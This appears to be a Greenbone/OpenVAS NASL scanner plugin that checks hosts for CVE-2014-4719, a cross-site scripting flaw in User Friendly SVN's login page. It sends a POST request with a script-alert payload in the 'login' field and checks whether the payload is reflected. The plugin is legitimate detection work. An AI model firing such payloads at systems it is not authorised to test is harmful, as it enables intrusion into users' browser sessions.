if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804725" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-4719" );
	script_bugtraq_id( 68155 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-07-29 17:06:00 +0530 (Tue, 29 Jul 2014)" );
	script_name( "User Friendly SVN 'login' Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with User Friendly SVN and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the /svn/login/ script does not validate input to the 'login'
  parameter before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "User-Friendly SVN version before 1.0.7" );
	script_tag( name: "solution", value: "Upgrade to version 1.0.7 or later." );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127177" );
	script_xref( name: "URL", value: "http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-4719.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/usvn", "/usvn/public", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/login/index.php" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(ContainsString( rcvRes, ">Welcome to USVN<" )){
		url = dir + "/login/index.php";
		postData = "login=<script>alert(\"Cross Site Scripting Attack\");</script>&password=&submit=Submit";
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "<script>alert(\"Cross Site Scripting Attack\");</script>" ) && ContainsString( rcvRes, ">USVN<" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

